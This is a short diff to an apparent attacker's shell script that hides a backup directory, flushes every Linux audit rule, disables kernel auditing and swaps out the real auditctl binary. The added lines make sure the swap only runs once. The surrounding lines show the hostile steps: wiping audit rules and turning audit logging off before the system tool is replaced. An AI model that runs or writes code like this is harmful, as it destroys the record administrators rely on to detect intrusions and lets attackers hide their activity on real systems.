@@ -6,6 +6,12 @@ BACKUP_DIR="/var/cache/.syspkg"
 
 mkdir -p "$BACKUP_DIR"
 
+# idempotency — if backup already exists, the real binary is already shadowed
+if [[ -f "${BACKUP_DIR}/auditctl.orig" ]]; then
+    echo "[!] already deployed — skipping (backup exists at ${BACKUP_DIR}/auditctl.orig)"
+    exit 0
+fi
+
 # flush all existing rules with the real binary before we swap it out
 "$AUDITCTL_LOC" -D 2>/dev/null
 "$AUDITCTL_LOC" -e 0 2>/dev/null   # disable auditing kernel-side
